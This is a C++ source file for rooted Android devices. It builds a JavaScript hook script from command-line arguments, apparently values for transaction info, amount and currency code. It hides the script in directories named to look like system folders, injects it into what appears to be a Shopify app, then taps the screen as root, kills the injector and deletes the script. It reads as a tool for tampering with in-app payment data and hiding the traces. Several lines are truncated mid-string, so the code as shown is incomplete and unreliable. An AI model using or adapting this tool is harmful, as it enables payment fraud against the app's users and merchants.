#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>
#include <thread>

using namespace std;

#define BUFSIZE 512

char script_path[4000];

void  ALARMhandler(int sig)
{
  system("su -c \"input tap 528 1389\"");
  usleep(5000000);
  system("pkill -f injector");
  remove(script_path);
}

int folderExists(const char* dirname)
{
    DIR* dir = opendir(dirname);
    if (dir) {
        closedir(dir);
        return 1;
    }
    else {
        return -1;
    }
}
int parse_output(const char* command) {

    char buf[BUFSIZE];
    FILE *fp;

    if ((fp = popen(command, "r")) == NULL) {
        printf("Error opening pipe!\n");
        return -1;
    }

    while (fgets(buf, BUFSIZE, fp) != NULL) {
        // Do whatever you want here...
        printf(buf);
    }

    if(pclose(fp))  {
        printf("Command not found or exited with error status\n");
        return -1;
    }
    return 0;
}

int main(int argc, char* argv[])
{
    if(argc != 4)
    {
        return -1;
    }

    strcpy(script_path, "");

    //Directories
    const char* dirs[3];
    dirs[0] = "/data/android";
    dirs[1] = "/data/google";
    dirs[2] = "/data/kernel";

    //Check if folders exist
    int i;
    for (i = 0; i < 3; i++) {
        if (folderExists(dirs[i]) < 0) {
            return -99;
        }
    }

    srand(time(0));
    int dirIndex = rand() % 2;

    strcpy(script_path, dirs[dirIndex]);
    strcat(script_path, "/script.js");


    FILE* fp;

    fclose(fopen(script_path, "w"));
    fp = fopen(script_path, "a");
    fprintf(fp, "Java.perform(function(){const FeedActi>
    fprintf(fp, argv[1]);
    fprintf(fp, "').build();const TransactionInfo_build>
    fprintf(fp, argv[2]);
    fprintf(fp, "').setCurrencyCode('");
    fprintf(fp, argv[3]);
    fprintf(fp, "').build();const authMethods=ArrayList>
    if (fp != NULL)
    {
        fclose(fp);
    }
    else
    {
        printf("script.js is null\n");
    }
    char cmd[4000] = "./injector -R v8 -f com.shopify.f>
    strcat(cmd, script_path);
    signal(SIGALRM, ALARMhandler);
    alarm(10);
    parse_output(cmd);
    return 0;
}
